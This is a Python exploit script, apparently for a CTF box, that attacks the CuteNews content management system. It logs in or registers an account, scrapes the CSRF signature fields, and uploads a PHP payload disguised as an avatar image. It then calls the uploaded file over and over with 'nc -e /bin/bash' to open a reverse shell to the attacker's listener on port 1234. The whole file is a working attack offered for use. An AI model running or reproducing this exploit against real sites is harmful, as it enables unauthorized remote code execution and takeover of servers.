import requests
import random
import string
import re
import os
import threading


class Exploit:
    
    def __init__(self, url):
        self.base_url = url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        }
    #session() for informations storage like cookies
        self.ss = requests.session()
    
    def login(self, username, password):
        login_url = self.base_url + "/CuteNews/index.php"
        data = {
            "action" : "dologin",
            "username" : username,
            "password" : password,  
        }
        
        login_res = self.ss.post(url=login_url, data=data, allow_redirects=False)
        content = login_res.content.decode()
        if "Invalid password or login" in content:
            print("Invalid password or login")
        else:
            response = self.ss.get(login_url + '?mod=main&opt=personal')
            if "Dashboard" in response.content.decode():
                print("login successfully")
    
    def register(self):       
        register_url = self.base_url + "/CuteNews/index.php?register"
        
        user_data = "".join(random.sample(string.ascii_letters + string.digits, 6))
        data = {
            "action": "register",
            "regusername": user_data,
            "regnickname": user_data,
            "regpassword": user_data,
            "confirm": user_data,
            "regemail": user_data + "@andrxid.com",
        }    
        
        print("Your cool username is: " + user_data)
        print("Your cool password is: " + user_data)
        print("Your cool email is: " + data["regemail"])

        register_res = self.ss.post(url=register_url, data=data)
        if "Dashboard" in register_res.content.decode():
            print("register successfully, now you are logged in")
    
    def req(self):
        while True:
            
            params = (
                    ('cmd', 'nc -e /bin/bash ' + self.ip + ' 1234'),
                    )
            response = requests.get(self.avatar_url, params=params)
        

        
    def bash(self):
        try:
            
            bashcommand = "nc -nvlp 1234"
            os.system(bashcommand)
        except KeyboardInterrupt:
            
            pass      
            
        
        
    def send_paylaod(self):
        filename = "payload.php"
        with open(filename, 'rb') as f:
            payload = f.read()

        vul_url = self.base_url + "/CuteNews/index.php?mod=main&opt=personal"

        # upload paylaod
        # get avatar url
        # send request to that url

        res = self.ss.get(vul_url)
        content = res.content.decode()
        editusername = re.findall('username" disabled="disabled" value="(.*?)"', content)[0]
        signature_key = re.findall('signature_key" value="(.*?)"', content)[0]
        signature_dsi = re.findall('signature_dsi" value="(.*?)"', content)[0]
        # print(editusername)
        # print(signature_key)
        # print(signature_dsi)

        data = {
            "mod": (None, "main"),
            "opt": (None, "personal"),
            "__signature_key": (None, signature_key),
            "__signature_dsi": (None, signature_dsi),
            "editpassword": (None, ""),
            "confirmpassword": (None, ""),
            "editnickname": (None, editusername),
            "avatar_file": (filename, payload),
            "more[site]": "",
            "more[about]": "",
        }

        pay_res = self.ss.post(url=vul_url, files=data)
        pay_content = pay_res.content.decode()

        self.avatar_url = re.findall('<img src="(.*?)"', pay_content)[0]
        print('--------------------------------------------------')
        print("[!] The uploaded file url is : ", self.avatar_url)

        self.ss.get(url=self.avatar_url)
        print("\n[!] We need to create the connection!!")
        self.ip = input("[*] Please inserte your listening ip address: ")        
        thread_1 = threading.Thread(target=self.bash)
        thread_1.start()
        
        thread_2 = threading.Thread(target=self.req)
        thread_2.start()

              

    def run(self):
        
        var = input("[?] Do you have already an account? [yes] or [no]: ").casefold()
        if var == "yes":
            username = input("\n[*] Enter your username: ")
            password = input("[*] Enter your password: ")
            self.login(username, password)
            self.send_paylaod()
        elif var == "no":
            self.register()
            self.send_paylaod()
    


if __name__ == '__main__':
    
    os.system(command="clear")
    print("""

██████╗  █████╗ ███████╗███████╗ █████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝ ██╔════╝
██████╔╝███████║███████╗███████╗███████║██║  ███╗█████╗  
██╔═══╝ ██╔══██║╚════██║╚════██║██╔══██║██║   ██║██╔══╝  
██║     ██║  ██║███████║███████║██║  ██║╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ (exploit by andrxid)

""")
    url = input("[*] Please input url: ")
    exploit = Exploit(url)
    exploit.run()
    

